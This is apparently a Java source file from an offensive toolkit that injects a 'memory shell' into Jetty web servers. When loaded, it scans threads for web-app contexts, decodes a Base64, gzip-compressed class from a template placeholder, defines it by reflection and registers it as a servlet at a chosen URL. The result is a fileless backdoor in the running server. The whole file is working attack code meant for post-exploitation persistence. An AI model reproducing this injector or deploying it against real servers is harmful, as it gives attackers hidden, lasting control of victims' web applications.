package com.reajason.javaweb.memshell.injector.jetty;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/20
 */
public class JettyServletInjector {

    static {
        new JettyServletInjector();
    }

    public JettyServletInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object servlet = getShell(context);
                inject(context, servlet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public Class<?> getServletClass(ClassLoader classLoader) throws ClassNotFoundException {
        try {
            return classLoader.loadClass("javax.servlet.Servlet");
        } catch (Throwable e) {
            return classLoader.loadClass("jakarta.servlet.Servlet");
        }
    }

    private List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                // jetty 6
                Object contextClassLoader = invokeMethod(thread, "getContextClassLoader");
                if (contextClassLoader.getClass().getName().contains("WebAppClassLoader")) {
                    contexts.add(getFieldValue(contextClassLoader, "_context"));
                } else {
                    // jetty 7+
                    Object table = getFieldValue(getFieldValue(thread, "threadLocals"), "table");
                    for (int i = 0; i < Array.getLength(table); i++) {
                        Object entry = Array.get(table, i);
                        if (entry != null) {
                            Object threadLocalValue = getFieldValue(entry, "value");
                            if (threadLocalValue != null) {
                                if (threadLocalValue.getClass().getName().contains("WebAppContext")) {
                                    contexts.add(getFieldValue(threadLocalValue, "this$0"));
                                }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader"));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "_classLoader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
        try {
            return webAppClassLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    public void inject(Object context, Object servlet) throws Exception {
        Object servletHandler = getFieldValue(context, "_servletHandler");

        if (invokeMethod(servletHandler, "getServlet", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            System.out.println("servlet is already injected");
            return;
        }


        String[] classNames = new String[]{
                "org.eclipse.jetty.servlet.ServletHolder",
                "org.eclipse.jetty.ee8.servlet.ServletHolder",
                "org.eclipse.jetty.ee9.servlet.ServletHolder",
                "org.eclipse.jetty.ee10.servlet.ServletHolder",
                "org.mortbay.jetty.servlet.ServletHolder",
        };

        Class<?> servletHolderClass = null;
        ClassLoader contextClassLoader = context.getClass().getClassLoader();

        for (String className : classNames) {
            try {
                servletHolderClass = contextClassLoader.loadClass(className);
            } catch (ClassNotFoundException ignored) {
            }
        }

        if (servletHolderClass == null) {
            throw new ClassNotFoundException("ServletHodler");
        }

        Constructor<?> servletHolderConstructor = servletHolderClass.getDeclaredConstructor();
        servletHolderConstructor.setAccessible(true);
        Object servletHolder = servletHolderConstructor.newInstance();
        invokeMethod(servletHolder, "setServlet", new Class[]{getServletClass(contextClassLoader)}, new Object[]{servlet});
        invokeMethod(servletHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(servletHandler, "addServlet", new Class[]{servletHolderClass}, new Object[]{servletHolder});
        invokeMethod(servletHandler, "addServletWithMapping", new Class[]{servletHolderClass, String.class}, new Object[]{servletHolder, getUrlPattern()});
        System.out.println("servlet inject successful");
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (NoSuchMethodException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
